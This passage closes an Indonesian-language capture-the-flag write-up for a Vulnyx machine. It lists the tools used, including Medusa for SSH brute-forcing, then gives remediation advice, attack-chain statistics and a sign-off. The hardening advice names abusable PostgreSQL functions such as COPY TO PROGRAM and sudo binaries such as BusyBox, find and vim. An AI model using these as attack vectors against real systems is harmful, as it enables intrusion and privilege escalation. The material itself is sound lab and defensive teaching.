- **Medusa** - SSH credential bruteforcing
- **Python** - Custom automation scripts

---

## Rekomendasi Remediasi

### Keamanan Database

1. **Hardening PostgreSQL:**
   - Jangan pernah menggunakan superuser accounts untuk aplikasi
   - Buat akun dengan privilege terbatas dan minimal permissions
   - Disable fungsi berbahaya: `pg_read_file()`, `pg_write_file()`, `COPY TO PROGRAM`
   - Implementasikan network segmentation - PostgreSQL tidak boleh publicly accessible

2. **Credential Management:**
   - Jangan pernah simpan kredensial di data yang dapat diakses user
   - Gunakan environment variables atau secrets management systems
   - Implementasikan regular credential rotation
   - Jangan pernah reuse password antar sistem

### Keamanan Aplikasi

3. **Information Disclosure:**
   - Sanitasi konten user-generated
   - Implementasikan proper access controls pada data sensitif
   - Jangan pernah ekspos internal notes atau debug information
   - Regular security audits terhadap stored data

4. **Parameter Fuzzing Protection:**
   - Implementasikan rate limiting
   - Validasi dan sanitasi semua user inputs
   - Gunakan UUID daripada sequential/predictable IDs
   - Implementasikan proper error handling (jangan leak info via errors)

### Keamanan Sistem

5. **Konfigurasi Sudo:**
   - Review sudo permissions secara berkala
   - Jangan pernah berikan unrestricted access ke powerful binaries (BusyBox, find, vim, etc.)
   - Implementasikan principle of least privilege
   - Gunakan specific commands daripada wildcards

6. **Password Policy:**
   - Enforce strong password requirements
   - Implementasikan password complexity rules
   - Gunakan MFA/2FA untuk SSH access
   - Monitor untuk credential reuse

7. **File Permissions:**
   - Pastikan proper ownership dan permissions pada sensitive files
   - Audit file permissions secara berkala
   - Gunakan SELinux/AppArmor untuk proteksi tambahan

---

## Statistik Challenge

- **Total ZIP Files:** 200
- **Password Terkumpul:** 199
- **Percobaan SSH Bruteforce:** 176 sebelum sukses
- **Waktu yang Dihemat dengan Otomasi:** ~3-4 jam estimasi
- **Custom Scripts yang Ditulis:** 2
- **Lateral Movements:** 2 (www-data → postgres → cesar)
- **Privilege Escalations:** 1 (cesar → root)

---

Terima kasih sudah membaca! Challenge ini dengan sempurna mendemonstrasikan pentingnya otomasi dalam penetration testing dan bahaya dari database superuser privileges.

Terus belajar, terus otomasi, dan selamat hacking! 🚀

**Challenge by:** Vulnyx  
**Writeup by:** HanzXD